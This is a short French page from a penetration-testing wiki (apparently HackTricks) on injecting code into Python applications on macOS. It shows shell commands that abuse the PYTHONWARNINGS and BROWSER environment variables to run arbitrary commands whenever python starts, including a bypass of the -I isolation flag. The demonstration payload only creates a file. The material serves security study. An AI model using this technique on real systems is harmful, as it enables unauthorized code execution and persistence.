# Injection d'applications Python sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d'environnement `PYTHONWARNINGS` et `BROWSER`

Il est possible de modifier les deux variables d'environnement pour exécuter du code arbitraire chaque fois que python est appelé, par exemple :
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
